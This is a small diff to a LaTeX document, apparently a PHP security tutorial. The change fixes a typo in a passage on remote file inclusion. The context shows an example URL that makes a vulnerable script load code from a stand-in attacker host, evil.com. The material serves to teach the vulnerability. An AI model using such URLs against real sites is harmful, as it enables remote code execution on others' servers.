@@ -171,7 +171,7 @@ if (isset($_GET['file']) && ($_GET['file'] != '')
 echo $createFooter();
 \end{phpcode}
 
-An attacked then could place some malicious code as a text file on some server (for example, at \texttt{http://evil.com/evil.txt}) and then use an URL like this to include that file:
+An attacker then could place some malicious code as a text file on some server (for example, at \texttt{http://evil.com/evil.txt}) and then use an URL like this to include that file:
 
 \begin{textcode}
 http://www.example.com/index.php?file=http://evil.com/evil.txt
